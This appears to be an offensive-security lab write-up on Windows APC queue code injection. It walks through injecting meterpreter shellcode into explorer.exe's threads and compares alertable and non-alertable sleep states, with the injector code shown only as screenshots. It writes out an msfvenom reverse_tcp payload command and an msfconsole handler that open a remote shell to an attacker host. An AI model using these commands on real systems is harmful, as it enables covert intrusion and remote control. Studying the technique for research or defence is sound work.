# Table of Contents  

- [APC Queue Code Injection](#apc-queue-code-injection)
- [Execution](#execution)
- [States](#states)
  * [Alertable State](#alertable-state)
  * [Non-Alertable State](#non-alertable-state)
- [Powershell -sta](#powershell--sta)
- [References](#references)

# APC Queue Code Injection

This lab looks at the APC (Asynchronous Procedure Calls) queue code injection.

Some simplified context around threads and APC queues:

<ul>
 <li>Threads execute code within processes</li>
 <li>Threads can execute code asynchronously by leveraging APC queues</li>
 <li>Each thread has a queue that stores all the APCs</li>
 <li>Application can queue an APC to a given thread (subject to privileges)</li>
 <li>When a thread is scheduled, queued APCs get executed</li>
 <li>Disadvantage of this technique is that the malicious program cannot force the victim thread to execute the injected code - the thread to which an APC was queued to, needs to enter/be in an alertable state (i.e SleepEx)</li>
</ul>

# Execution

A high level overview of how this lab works:

<ul>
 <li>Write a C++ program apcqueue.exe that will:</li>
  <ul>
   <li>Find explorer.exe process ID</li>
   <li>Allocate memory in explorer.exe process memory space</li>
   <li>Write shellcode to that memory location</li>
   <li>Find all threads in explorer.exe</li>
   <li>Queue an APC to all those threads. APC points to the shellcode</li>
  </ul>
 <li>Execute the above program</li>
 <li>When threads in explorer.exe get scheduled, our shellcode gets executed</li>
 <li>Meterpreter shells</li>
</ul>

Let's start by creating a meterpreter shellcode to be injected into the victim process:

```msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=443 -f c```

![image](https://github.com/0x074b/Code.Process-Injection/assets/83349783/0dfb28ae-e96e-46bc-a456-cbded60b1e74)

I will be injecting the shellcode into ```explorer.exe``` since there's usually a lot of thread activity going on, so there is a better chance to encounter a thread in an alertable state that will kick off the shellcode. I will find the process I want to inject into with ```Process32First``` and ```Process32Next``` calls:

![image](https://github.com/0x074b/Code.Process-Injection/assets/83349783/a193702e-2659-4f2f-97e5-e49d460be6cb)

Once explorer PID is found, we need to get a handle to the explorer.exe process and allocate some memory for the shellcode. The shellcode is written to explorer's process memory and additionally, an APC routine, which now points to the shellcode, is declared:

![image](https://github.com/0x074b/Code.Process-Injection/assets/83349783/01153163-bbc4-41ca-8033-65d934a8fbed)

If we compile and execute ```apcqueue.exe```, we can indeed see the shellcode gets injected into the process successully:

![image](https://github.com/0x074b/Code.Process-Injection/assets/83349783/556f6b57-eaae-40e4-a3d6-28e73bd70c50)

A quick detour, the below shows a screenshot from the Process Hacker where our malicious program has a handle to explorer.exe, good to know for debugging and troubleshooting:

![image](https://github.com/0x074b/Code.Process-Injection/assets/83349783/78c455cb-2521-489b-837c-0331d2a28abc)

Back to the code, we can now enumerate all threads of explorer.exe and queue an APC (points to the shellcode) to them:

![image](https://github.com/0x074b/Code.Process-Injection/assets/83349783/94350f26-3b24-455b-88bb-cbe9945f57ee)

Switching gears to the attacking machine, let's fire up a multi handler and set an ```autorunscript``` to migrate meterpreter sessions to some other process before they die with the dying threads:

```
msfconsole -x "use exploits/multi/handler; set lhost 10.0.0.5; set lport 443; set payload windows/x64/meterpreter/reverse_tcp; exploit"
set autorunscript post/windows/manage/migrate
```

Once the ```apcqueue``` is compiled and run,  a meterpreter session is received - the technique worked:

![image](https://github.com/0x074b/Code.Process-Injection/assets/83349783/19be68e9-9a50-4e3b-8f05-10dd0a4550d5)

# States

As mentioned earlier, in order for the APC code injection to work, the thread to which an APC is queued, needs to be in an ```alertable``` state. 

To get a better feel of what this means, I created another project called ```alertable``` that only did one thing, slept for 60 seconds. The application was sent to sleep using (note the important second parameter):

```
DWORD SleepEx(
  DWORD dwMilliseconds,
  BOOL  bAlertable
);
```

Let's put the new project to sleep in both alertable and non-alertable states and see what heppens when an APC is queued to it.

# Alertable State

Let's compile the ```alertable.exe``` binary with ```bAleertable = true``` first and then launch the ```apcqueue.exe```.

Since ```alertable.exe``` was in an alertable state, the code got executed immediately and a meterpreter session was established:

![image](https://github.com/0x074b/Code.Process-Injection/assets/83349783/4b335638-46f9-4133-bc64-2f9249eb5cda)

# Non-Alertable State

Now let's recompile ```alertable.exe``` with ```bAlertable == false``` and try again, shellcode does not get executed:

![image (1)](https://github.com/0x074b/Code.Process-Injection/assets/83349783/fcabb3d3-98b4-4bdf-9f54-2353fd2afcbc)

# Powershell -sta

An interesting observation is that if you try injecting into powershell.exe which was started with a ```-sta``` switch (Single Thread Apartment), we do not need to spray the APC across all its threads, main thread is enough and gives a reliable shell:

![apc-powershell](https://github.com/0x074b/Code.Process-Injection/assets/83349783/618ba99e-8e65-431b-90b7-a18042fa5e2c)

Note that the injected powershell process becomes unresponsive. 

# References

> https://blogs.microsoft.co.il/pavely/2017/03/14/injecting-a-dll-without-a-remote-thread/



































